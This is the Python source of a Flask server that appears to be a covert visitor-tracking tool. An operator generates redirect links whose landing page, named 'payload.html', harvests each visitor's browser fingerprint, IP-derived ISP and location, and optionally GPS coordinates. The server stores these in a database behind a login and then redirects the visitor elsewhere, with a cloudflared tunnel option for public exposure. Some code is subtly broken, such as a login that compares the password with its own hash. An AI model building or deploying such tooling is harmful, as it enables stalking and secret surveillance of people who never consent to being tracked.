
import os
import json
import sqlite3
import argparse
import random
import string
from hashlib import sha256
from datetime import datetime
from flask import Flask, render_template, request, jsonify, redirect, session, send_from_directory
from marshmallow import ValidationError
import logging
import requests
import threading
from src.Cloudflared import Cloudflared
from src.DatabaseSchema import init_db, UserInfoSchema, get_all_links, insert_link, LinksSchema, get_link_by_url
import time

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Configure SQLite database
db_dir = 'etc'
if not os.path.exists(db_dir):
    os.makedirs(db_dir)
db_path = os.path.join(db_dir, 'clients.db')

# Set up logging to file
log_file_path = 'etc/flask.log'
logging.basicConfig(filename=log_file_path,
                    level=logging.INFO,
                    format='%(asctime)s [%(levelname)s]: %(message)s')


# Generate a random password for the /clients route
def generate_password(length=30):
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for _ in range(length))


def process_client_info(validated_data: dict):
    # Check if latitude and longitude are missing
    latitude = validated_data.get('latitude')
    longitude = validated_data.get('longitude')
    public_ip = validated_data.get('publicIP', "Unknown")

    # Initialize ISP and location variables
    isp = "Unknown"
    city = region = country_code = region_name = zip_code = org = None

    if public_ip and public_ip != "Unknown":
        url = f"http://ip-api.com/json/{public_ip}"
        response = requests.get(url)
        if response.ok:
            data = response.json()
            isp = data.get("isp", "Unknown")
            city = data.get("city", "Unknown")
            region = data.get("region", "Unknown")
            country_code = data.get("countryCode", "Unknown")
            region_name = data.get("regionName", "Unknown")
            zip_code = data.get("zip", None)  # Store as None if not found
            org = data.get("org", "Unknown")

    # If latitude and longitude are missing or zero, get them from the IP
    if (latitude in [None, 0.0] or longitude in [None, 0.0]) and public_ip != "Unknown":
        response = requests.get(f'https://ipinfo.io/{public_ip}/json')
        if response.status_code == 200:
            geo_info = response.json()
            loc = geo_info.get('loc', '').split(',')
            if len(loc) == 2:
                latitude = float(loc[0])
                longitude = float(loc[1])
                validated_data['latitude'] = latitude
                validated_data['longitude'] = longitude

    values = (
        latitude,
        longitude,
        city,
        region,
        country_code,
        zip_code,
        org,
        region_name,
        public_ip,
        isp,
        validated_data.get('userAgent', "Unknown"),
        validated_data.get('platform', "Unknown"),
        validated_data.get('screenWidth', 0),
        validated_data.get('screenHeight', 0),
        validated_data.get('colorDepth', 0),
        validated_data.get('viewportWidth', 0),
        validated_data.get('viewportHeight', 0),
        validated_data.get('isOnline', "Unknown"),
        validated_data.get('language', "Unknown"),
        validated_data.get('languagePreferences', "Unknown"),
        validated_data.get('timezone', "Unknown"),
        validated_data.get('timezoneOffset', 0),
        validated_data.get('cookiesEnabled', "Unknown"),
        validated_data.get('doNotTrack', "Unknown"),
        validated_data.get('connectionType', "Unknown"),
        validated_data.get('browserName', "Unknown"),
        validated_data.get('browserVersion', "Unknown"),
        validated_data.get('timeOnPage', 0.0),
        validated_data.get('referrer', "Unknown"),
        validated_data.get('deviceType', "Unknown"),
        ', '.join(validated_data.get('installedPlugins', [])),  # Joining list to a string
        ', '.join(validated_data.get('availableFonts', [])),  # Joining list to a string
        validated_data.get('screenOrientation', "Unknown"),
        ', '.join(validated_data.get('audioCapabilities', [])),
        validated_data.get('touchSupport', "Unknown"),
        validated_data.get('hardwareConcurrency', 0),
        validated_data.get('sessionStorageSupported', "Unknown"),
        validated_data.get('canvasFingerprint', "Unknown"),
        validated_data.get('webGLFingerprint', "Unknown"),
        validated_data.get('isDST', "Unknown"),
        str(validated_data.get('featuresSupported', {})).replace("'", "").replace("{", "").replace("}", ""),
        validated_data.get('deviceMemory', 0.0),
        validated_data.get('batteryStatus', {}).get("charging", "Unknown"),
        validated_data.get('effectiveType', "Unknown"),
        validated_data.get("timestamp", "Unknown")
    )

    with sqlite3.connect(db_path) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO user_info (
                latitude, longitude, city, region, country_code, zip_code, org,
                region_name, public_ip, isp, user_agent, platform,
                screen_width, screen_height, color_depth, viewport_width,
                viewport_height, is_online, language, language_preferences,
                timezone, timezone_offset, cookies_enabled, do_not_track,
                connection_type, browser_name, browser_version, time_on_page,
                referrer, device_type, installed_plugins, available_fonts,
                screen_orientation, audio_capabilities, touch_support,
                hardware_concurrency, session_storage_supported,
                canvas_fingerprint, webgl_fingerprint, is_dst,
                features_supported, device_memory, battery_status,
                effective_type, timestamp
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', values)
        conn.commit()


@app.route('/favicon.ico')
def favicon():
    return send_from_directory("static", 'favicon.ico', mimetype='image/vnd.microsoft.icon')


@app.route("/statistics", methods=["GET", "POST"])
def statistics():
    if request.method == "POST":
        # Initialize the attempts counter in session if it doesn't exist
        if 'attempts' not in session:
            session['attempts'] = 0

        if session['attempts'] >= 3:
            logging.critical(f"3 failed attempts at the password where made by {request.remote_addr}")
            return render_template("login.html", error="Too many failed attempts you have been locked out.")

        # Check if the password matches
        password = request.form.get('password')
        if password != clients_password_hash:
            session['attempts'] += 1  # Increment the attempts counter
            logging.warning("Failed password attempt made by {request.remote_addr}")
            return render_template("login.html", error=f"Incorrect password.")

        # Reset attempts on successful authentication
        session['authenticated'] = True
        session.pop('attempts', None)  # Clear attempts on success
        logging.info("Successful login attempt from {request.remote_addr}")
        return redirect("/statistics")  # Redirect to the same route

    # Fetch user information from the database if authenticated
    if session.get('authenticated'):
        link_map = get_all_links(db_path)
        if link_map:
            link_map.reverse()

        with sqlite3.connect(db_path) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM user_info")  # Fetch all records
            user_info_records = cursor.fetchall()

        # Convert the records to a list of dictionaries for easy rendering in the template
        user_info_list = []
        for record in user_info_records:
            user_info_list.append({
                "id": record[0],
                "latitude": record[1],
                "longitude": record[2],
                "city": record[3],
                "region": record[4],
                "country_code": record[5],
                "zip_code": record[6],
                "org": record[7],
                "region_name": record[8],
                "public_ip": record[9],
                "isp": record[10],
                "user_agent": record[11],
                "platform": record[12],
                "screen_width": record[13],
                "screen_height": record[14],
                "color_depth": record[15],
                "viewport_width": record[16],
                "viewport_height": record[17],
                "is_online": record[18],
                "language": record[19],
                "language_preferences": record[20],
                "timezone": record[21],
                "timezone_offset": record[22],
                "cookies_enabled": record[23],
                "do_not_track": record[24],
                "connection_type": record[25],
                "browser_name": record[26],
                "browser_version": record[27],
                "time_on_page": record[28],
                "referrer": record[29],
                "device_type": record[30],
                "installed_plugins": record[31],
                "available_fonts": record[32],
                "screen_orientation": record[33],
                "audio_capabilities": record[34],
                "touch_support": record[35],
                "hardware_concurrency": record[36],
                "session_storage_supported": record[37],
                "canvas_fingerprint": record[38],
                "webgl_fingerprint": record[39],
                "is_dst": record[40],
                "features_supported": record[41],
                "device_memory": record[42],
                "battery_status": record[43],
                "effective_type": record[44],
                "timestamp": record[45],
            })

        return render_template("statistics.html", user_info=user_info_list, link_map=link_map)

    # If not authenticated, show the login form
    return render_template("login.html")


@app.route('/clear-database', methods=['POST'])
def clear_database():
    # Make sure user is authenticated
    if not session.get('authenticated'):
        logging.critical(f"Unauthenticated request to clear database from {request.remote_addr}")
        return jsonify({"status": "error", "message": "Unauthorized access"}), 403

    # Remove everthing from the database
    try:
        with sqlite3.connect(db_path) as conn:
            cursor = conn.cursor()
            cursor.execute("DELETE FROM user_info")  # Clear all records from the user_info table
            cursor.execute("DELETE FROM links")
            conn.commit()
        logging.info("Database cleared successfully.")
        return jsonify({"status": "success", "message": "Database cleared."}), 200
    except Exception as e:
        logging.error(f"Error clearing database: {str(e)}")
        return jsonify({"status": "error", "message": "Unexpected error."}), 500


@app.route("/delete-link", methods=["POST"])
def delete_link():
    # Make sure user is authenticated
    if not session.get('authenticated'):
        logging.critical(f"Unauthenticated request to remove link from database from {request.remote_addr}")
        return jsonify({"status": "error", "message": "Unauthorized access"}), 403

    data = request.json
    custom_link = data.get("custom_link", "")

    # Ensure custom_link is not empty
    if not custom_link:
        logging.error("No link was specified for removal")
        return jsonify({"status": "error", "message": "No link specified."}), 400

    try:
        with sqlite3.connect(db_path) as conn:
            cursor = conn.cursor()
            cursor.execute("DELETE FROM links WHERE link1 = ?", (custom_link,))
            conn.commit()
        logging.info(f"Successfully removed {custom_link} from database.")
        return jsonify({"status": "success", "message": "Link successfully removed from the database."})
    except Exception as e:
        logging.error(f"There was an error while removing the link {custom_link} from the database: {e}")

    return jsonify({"status": "error", "message": "Unexpected error"}), 500


@app.route("/generate-link", methods=["POST"])
def generate_link():
    # Make sure user is authenticated
    if not session.get('authenticated'):
        logging.warning(f"Unauthenticated request to generate link from {request.remote_addr}")
        return jsonify({"status": "error", "message": "Unauthorized access"}), 403

    data = request.json
    schema = LinksSchema()

    try:
        validated_data = schema.load(data)
    except ValidationError as e:
        logging.error("Incorrect link schema from {request.remote_addr} Data: {data}")
        return jsonify({"status": "error", "message": "Incorrect schema"}), 400
    try:
        insert_link(db_path, validated_data["generatedLink"], validated_data["redirectUrl"], validated_data["gpsEnabled"])
        logging.info(f"Successfully inserted new link {validated_data['generatedLink']} into the database.")
        return jsonify({"status": "success", "message": "Links successfully inserted into database"})
    except Exception as e:
        logging.error(f"There was an error while generating a new link: {e}")

    return jsonify({"status": "error", "message": "Unexpected error"}), 401


@app.route('/', methods=["GET", 'POST'], defaults={"path": ""})
@app.route("/<path:path>", methods=["GET", 'POST'])
def user_info(path):

    url = request.url
    link_data = get_link_by_url(db_path, url)
    # Log the clients information with in index page that loads the javascript
    if request.method == "GET":
        logging.info(f"New request from {request.remote_addr} URL: {url}")
        if link_data:
            generated_link, redirect_link, gps_enabled = link_data
            return render_template('payload.html', attempt_geolocation=gps_enabled)

        logging.error("Wasnt able to find url in the database URL: {url}")
        return render_template('payload.html', attempt_geolocation=0)

    user_data = request.json

    # Validate incoming data
    schema = UserInfoSchema()
    user_data["timestamp"] = datetime.now().strftime("%d-%m-%y %H:%M")

    try:
        validated_data = schema.load(user_data)
    except ValidationError:
        logging.error(f"Incorrect schema for user data from {request.remote_addr} Data: {user_data}")
        return jsonify({"status": "error", "message": "Incorrect schema"}), 400

    # Start new thread to processes the data and insert it into the database
    logging.info(f"Processing new client data from {request.remote_addr}")
    _ = threading.Thread(target=process_client_info, args=[validated_data,], daemon=True).start()

    if link_data:
        generated_link, redirect_link, gps_enabled = link_data
        logging.info("Redirecting {request.remote_addr} to {redirect_link}")
        return jsonify({"status": "success", "redirect": redirect_link, "attempt_geolocation": gps_enabled})

    logging.error("Wasnt able to find redirect url in the database URL: {url}")
    return jsonify({"status": "success", "redirect": "https://localhost"})


def generate_self_signed_cert(cert_path, key_path):
    from subprocess import run
    # Command to generate self-signed certificates
    command = [
        'openssl', 'req', '-x509', '-nodes', '-days', '365',
        '-newkey', 'rsa:2048',
        '-keyout', key_path,
        '-out', cert_path,
        '-subj', '/CN=localhost'
    ]

    # Execute the command
    run(command, check=True)


def parse_args():
    parser = argparse.ArgumentParser(description='Run the Flask application.')
    parser.add_argument("-d", '--debug', action='store_true', help='Enable debug mode.')
    parser.add_argument('--ssl-cert', type=str, default="etc/cert.pem", help='Path to the SSL certificate file (Default etc/cert.pem).')
    parser.add_argument('--ssl-key', type=str, default="etc/key.pem", help='Path to the SSL key file (Default etc/key.pem).')
    parser.add_argument("-c", "--cloudflared", action="store_true", help="Use cloudflared tunnel")
    parser.add_argument("-p", '--port', type=int, default=5000, help='Port number to use.')
    parser.add_argument("-i", '--interface', type=str, default="127.0.0.1", help='Interface to use (Default 127.0.0.1)')
    a = parser.parse_args()

    if not os.path.isfile(a.ssl_key) or not os.path.isfile(a.ssl_cert):
        print("Generating self-signed SSL certificate and key...")
        generate_self_signed_cert(a.ssl_cert, a.ssl_key)

    return parser.parse_args()


def main():
    # Run the Flask application
    if args.cloudflared:
        cf = Cloudflared(flask_app=app, download_dir="etc", host=args.interface, port=args.port)
        try:
            cf_url = cf.start()
            if not cf_url.strip():
                logging.error("Unable to detect cloudflared URL")
                print("Unable to detect cloudflared URL ")
                cf.stop()
                exit()

            print(f"Cloudflared URL: {cf_url}")
            while cf.flask_thread:
                time.sleep(1)

        except KeyboardInterrupt:
            print()
            print("Stopping cloudflared tunnel")
            cf.stop()

    else:
        app.run(host=args.interface, port=args.port, debug=args.debug, ssl_context=(args.ssl_cert, args.ssl_key))


if __name__ == "__main__":
    args = parse_args()
    init_db(db_path)


    # Display the generated password and statistics link
    clients_password = generate_password()
    clients_password_hash = sha256(clients_password.encode()).hexdigest()
    print(f"Statistics URL: https://localhost:{args.port}/statistics")
    print(f"Login password: \033[92m{clients_password}\033[0m")

    main()

